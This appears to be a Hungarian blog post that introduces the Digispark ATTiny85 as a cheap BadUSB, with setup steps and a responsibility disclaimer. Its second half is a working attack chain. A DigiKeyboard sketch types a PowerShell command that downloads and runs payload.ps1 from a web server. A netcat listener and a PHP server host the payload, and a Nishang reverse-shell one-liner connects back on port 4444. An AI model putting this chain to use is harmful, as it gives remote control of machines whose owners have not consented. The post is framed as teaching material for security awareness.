+++
title= "Csak egy ártatlan pendrive"
date= 2024-07-23T19:22:46+02:00
draft= false
summary = "Filmekben lehet látni olyat, hogy a titkosügynökök a számítógépbe dugnak egy pendrive-ot és utána történik a varázslat. Ez is valami ehhez hasonló."
description = "Piacon már régota kint van a USB Rubber Ducky, ami lényegében egy pendrive-nak álcázott mikrokontroller. Közönséges érdelődők számára kicsit elérhetetlen áron van szerintem, mivel jelenleg $80 egy darab. Ezért szerettem volna kipróbálni egy olcsóbb de minőségben közelítő alternatívát."
tags = ['Digispark', 'badusb', 'infosec']
+++

Bedugod, eltelik 5 másodperc, megtörténik a varázs és kihúzod. Nem, ez most nem az forgatókönyv amire gondolsz, ez történik a USB Rubber Ducky-hez hasonló mikrokontrollerek használatakor. Lényegében a számítógép ilyenkor ezeket az eszközöket HID-ként, azaz Human Interface Device-ként kezeli, mint például egy billentyűzetet is. Ez azt engedi meg, hogy lényegében az USB bedugása után elindul az arra feltöltött program, és elkezdi gépelni ezerrel azt, mindeközben az operációs rendszer teljes engedelmességet tanusít. Első kérdés az lenne, hogy ezt miért teheti meg, miért nem kér a számítógép jogosultságot? Billentyűzetben is megbízik a számítógép, mivel ember ül mögötte nem pedig egy zsarolóprogram vagy bármi ilyesmi, és hasonló viszonyúl minden más HID-hez is, beleértve a "badUSB"-t is. Ezek a kis eszközök viszont sokkal gyorsabban tudnak gépelni mint egy ember, ezért a lehetőségeknek csak a kreativitás szab határt. Azt nem szabad elfelejteni, hogy talán azért nem jelent ez akkora biztonsági kockázatot, mint ahogyan én most itt felvezettem, mert egy nagyon fontos feltételnek teljesülnie kell a müködéséhez: fizikai jelenlét. Ez nagy kihívást jelenthet a legtöbb támadó fél számára, de az esély rá nem 0 tehát számolni kell vele. Olyanra is volt már példa, hogy célzottan például egy rendőrség vagy irodaház parkolójában szórtak szét ilyen kártékony USB-ket és az áldozatok, emberlétükre kiváncsiságból bedugták a szervezeti, munkai számítógépükbe és a baj meg is történt még mielőtt észrevették volna.

Persze nem csak csúnya dolgokra lehet ezt használni. Ha például rendszergazdák vagyunk akkor akár a repetatív feladatokat könnyen felcserélhetjük egy bedugás és kihúzás mozdulatra ez segítségével.

## Felelősség

A tudás és a tapsztalat felelősséggel, és azon kötelességgel jár, hogy csak is embertársaink, és környezetünk előnyére, jólétére használhatjuk fel. Semmilyen körülmények között nem élhetünk vissza azzal a hatalommal, amelyet az élet ruházott ránk, amikor voltunk olyan szerencsések, hogy valamire rájöttünk, valamit megtanultunk. Ez különösen igaz a kiberbiztonság témakörében és még máskor is ki fogom ezt hangsúlyozni. Én az itt bemutatott technikákat csakis saját, vagy olyan rendszeren, számítógépen próbálom ki, amelyekhez engedélyt kaptam a tulajdonostól. A célom az a dokumentálás és a tanításnak a szándéka, hogy így egy biztonságosabb internet és informatika születhessen. **Ezáltal szeretném tisztázni, hogy engem semmilyen felelősség nem terhel, hogy TE a saját döntéseid után ezt a tudást mire használod.**

## Digispark ATTiny85

Az alternatívát a Digispark kínálja mely egy ATTiny85 8 bites RISC utasításkészletű mikrokontrollerrel rendelkezik, amely hála a fejlesztőknek, kompatibilis az Arduino IDE fejlesztői környezettel egy kis babrálás után. Az ára rendkívül baráti a $80-hoz képest, magyarországi forgalmazók 1500 Ft környékén árulják, de ha van időd megvárni, akkor lehet hogy Aliexpressről olcsőbban be tudod szerezni. Nem promóció de [itt](https://www.hestore.hu/prod_10036419.html) egy magyar forgalmazóra egy példa.

49-micronucleus.rules
/etc/udev/rules.d/49-micronucleus.rules
SUBSYSTEMS=="usb", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666"
KERNEL=="ttyACM*", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666", ENV{ID_MM_DEVICE_IGNORE}="1"
sudo udevadm control --reload-rules

nc -lp 4444
sudo php -S 0.0.0.0:80 -t /directory/to/folder/of/powershellScript/

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}

#A simple and small reverse shell by samratashok's Nishang framework. Change the Host IP Address and Port according to your setup as described in the README file of the script. 
#$sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json

file>>prefrences additional board manager urls
boards manager --> digistump avr arduino-boards-index
micronucleus, default digispark board

